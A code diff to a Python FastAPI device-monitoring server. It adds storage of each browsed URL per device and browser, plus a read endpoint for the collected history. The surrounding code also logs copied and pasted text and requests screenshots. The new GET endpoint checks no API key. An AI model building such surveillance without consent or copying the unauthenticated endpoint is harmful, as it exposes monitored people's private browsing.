@@ -31,6 +31,7 @@ LOG_PATH = BASE_DIR / "text.txt"
 HTML_PATH = BASE_DIR / "web" / "index.html"
 messages: Deque[Dict[str, object]] = deque(maxlen=MAX_MESSAGES)
 website_history: Deque[Dict[str, object]] = deque(maxlen=500)
+visited_links: Deque[Dict[str, object]] = deque(maxlen=500)
 devices: Dict[str, Dict[str, object]] = {}
 device_online_states: Dict[str, bool] = {}
 screenshot_requests: Dict[str, int] = {}
@@ -1308,6 +1309,36 @@ def save_device(device_id, device_name, last_seen, started_at, joined_at, teleme
             )
 
 
+def save_visited_link_record(device_id, device_name, browser, url, visited_at):
+    item = {
+        "device_id": str(device_id or "unknown").strip() or "unknown",
+        "device_name": str(device_name or "Unknown device").strip() or "Unknown device",
+        "browser": str(browser or "Unknown browser").strip() or "Unknown browser",
+        "url": str(url or "").strip(),
+        "visited_at": int(visited_at),
+    }
+    if not item["url"].startswith(("http://", "https://")):
+        return False
+    visited_links.append(item)
+    if not DATABASE_URL:
+        return True
+    try:
+        with psycopg.connect(DATABASE_URL) as connection:
+            with connection.cursor() as cursor:
+                cursor.execute(
+                    """
+                    INSERT INTO visited_links (device_id, device_name, browser, url, visited_at)
+                    VALUES (%s, %s, %s, %s, %s)
+                    ON CONFLICT (device_id, browser, url, visited_at) DO NOTHING
+                    """,
+                    (item["device_id"], item["device_name"], item["browser"], item["url"], item["visited_at"]),
+                )
+    except Exception as error:
+        print(f"Could not save visited link: {error}")
+        return False
+    return True
+
+
 def write_text_log():
     line_text = "\n".join(
         f"{int(item['time'])}|{item['device_id']}|{item['device_name']}|{1 if item.get('is_pasted') else 0}|{1 if item.get('is_copied') else 0}|{item['text']}"
@@ -1529,6 +1560,43 @@ async def fetch_website_history(device_id: str | None = None):
     ])
 
 
+@app.get("/api/visited-links")
+async def fetch_visited_links(device_id: str | None = None):
+    selected_device_id = (device_id or "").strip()
+    cutoff = int(time.time() * 1000) - WEBSITE_HISTORY_MAX_AGE_MS
+    if DATABASE_URL:
+        try:
+            with psycopg.connect(DATABASE_URL) as connection:
+                with connection.cursor() as cursor:
+                    query = """
+                        SELECT id, device_id, device_name, browser, url, visited_at
+                        FROM visited_links
+                    """
+                    values = [cutoff]
+                    query += " WHERE visited_at >= %s"
+                    if selected_device_id:
+                        query += " AND device_id = %s"
+                        values.append(selected_device_id)
+                    query += " ORDER BY visited_at DESC LIMIT 500"
+                    cursor.execute(query, values)
+                    rows = cursor.fetchall()
+            return JSONResponse([
+                {
+                    "id": row[0], "device_id": row[1], "device_name": row[2],
+                    "browser": row[3], "url": row[4], "visited_at": row[5],
+                }
+                for row in rows
+            ])
+        except Exception as error:
+            print(f"Could not load visited links: {error}")
+            return JSONResponse({"ok": False, "error": "visited links unavailable"}, status_code=503)
+    return JSONResponse([
+        item for item in reversed(visited_links)
+        if item["visited_at"] >= cutoff
+        and (not selected_device_id or item["device_id"] == selected_device_id)
+    ])
+
+
 @app.post("/api/website-history")
 async def add_website_history(
     payload: WebsiteHistoryInput, x_api_key: str | None = Header(default=None)
@@ -1570,6 +1638,7 @@ async def add_website_history(
     except Exception as error:
         print(f"Could not save website history: {error}")
         return JSONResponse({"ok": False, "error": "website history storage unavailable"}, status_code=503)
+    save_visited_link_record(device_id, payload.device_name.strip() or "Unknown device", payload.browser.strip() or "Unknown browser", url, payload.visited_at)
     if matches_monitored_site_url(url):
         notify_monitored_site_alerts(device_id, payload.device_name.strip() or "Unknown device", url)
     return JSONResponse({"ok": True})
